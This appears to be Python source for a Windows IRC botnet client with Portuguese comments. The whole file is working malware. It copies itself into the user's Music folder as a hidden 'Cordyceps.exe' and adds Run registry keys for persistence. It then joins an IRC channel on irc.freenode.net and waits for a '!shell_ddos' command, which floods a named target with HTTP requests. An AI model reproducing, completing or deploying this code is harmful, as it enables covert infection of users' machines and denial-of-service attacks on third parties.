import socket
import subprocess
import os
import sys
import threading
import socket
import random
import string
from os.path import realpath, join
import winreg
import shutil
from pathlib import Path
import ctypes
import time

FILE_ATTRIBUTE_HIDDEN = 0x02


def rename_arqv(a1, index):
    old_file = os.path.join(a1, index)
    new_file = os.path.join(a1, "Cordyceps.exe")
    try:
        os.rename(old_file, new_file)
        return new_file
    except Exception as e:
        print(e)


oldAdress = sys.argv[0]
shearchAdress = 'C:/Users/'

pesquisa = os.listdir(shearchAdress)

pesEnd = len(pesquisa)

for i in range(len(pesquisa)):
    if pesquisa[i] in oldAdress:
        print("DIRETORIO ENCONTRADO:", pesquisa[i])
        home = pesquisa[i]

newAdress = 'C:/Users/{0}/Music'.format(home)

caminhoCompleto_old = oldAdress
caminhoCompleto_new = newAdress

index = sys.argv[0].split("\\")[-1]


if not "Music" in os.path.dirname(sys.argv[0]):
    print("b")
    shutil.move(caminhoCompleto_old, caminhoCompleto_new)
    if not "Cordyceps.exe" in sys.argv[0]:
        newFile = rename_arqv(newAdress, index)

else:
    if not "Cordyceps.exe" in sys.argv[0]:
        newFile = rename_arqv(newAdress, index)
    print("_")
    
newwFile = os.path.join(newAdress, "Cordyceps.exe")


time.sleep(3)

ret = ctypes.windll.kernel32.SetFileAttributesW(r'C:\\Users\\{0}\\Music\\Cordyceps.exe'.format(home), FILE_ATTRIBUTE_HIDDEN)
if ret:
    print('Ficheiro definido para oculto')
else:  # se retornar algum erro
    print("a")
    raise ctypes.WinError()


keyVal = 'Software\Microsoft\Windows\CurrentVersion\Run'

try:
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, keyVal, 0, winreg.KEY_SET_VALUE)
except:
    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyVal)
winreg.SetValueEx(key, 'ZOMB1E', 0, winreg.REG_SZ, sys.argv[0])
winreg.CloseKey(key)


keyVal = 'Software\Microsoft\Windows\CurrentVersion\Run'

try:
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, keyVal, 0, winreg.KEY_SET_VALUE)
except:
    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyVal)
winreg.SetValueEx(key, 'ZOMBI3', 0, winreg.REG_SZ, newwFile)
winreg.CloseKey(key)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print(os.path.dirname(sys.argv[0]))

def id_generator(size=10, chars=string.ascii_uppercase):
    return ''.join(random.choice(chars) for _ in range(size))



HOST = "irc.freenode.net"
PORT = 6667

NICK = id_generator() + str(random.randrange(1,2500))
IDENT = "OVNI"
REALNAME = "OVNI"
canal = '#test-py'


porta = 80
ip = '182.21.20.32'

s.connect((HOST, PORT))


def attack(target):
    while True:
        ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ss.connect((target, porta))
        ss.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, porta))
        ss.sendto(("Host: " + ip + "\r\n\r\n").encode('ascii'), (target, porta))
        ss.close()
        break


def recv_command(msg, s):
    if '!shell_ddos' in msg:
        print("Comando recebido")

        brute = s.recv(2048).decode('ascii')
        zem = brute[1:].split(':')[1]
        target = zem.split()[0]

        s.send(bytes("PRIVMSG %s :%s\r\n"% (canal, "aguarde !!!"), 'ascii'))
        for i in range(500):
            thread = threading.Thread(target=attack(target))
            thread.start()
        s.send(bytes("PRIVMSG %s :%s\r\n"% (canal, "Ataque finalizado"), 'ascii'))

def registra(NICK, IDENT, HOST, REALNAME):
    s.send(bytes("NICK %s\r\n" % NICK, "UTF-8"))
    s.send(bytes("USER %s %s bla :%s\r\n" % (IDENT, HOST, REALNAME), "UTF-8"))
    s.send(bytes("JOIN #test-py\r\n", "UTF-8"))



try:
    registra(NICK, IDENT, HOST, REALNAME)
except Exception as e:
    print ('EXECPT ------------------ ', e)

def checa_ping(sock, msg):
    if 'PING :' in msg:
        codigo_ping = msg.split('PING :')[-1]
        resposta_pong = 'PONG :{}'.format(codigo_ping)
        sock.send(resposta_pong.encode('UTF-8'))
        

while True:
    msg = s.recv(2048).decode('UTF-8')
    print(msg)
    checa_ping(s, msg)
    recv_command(msg, s)
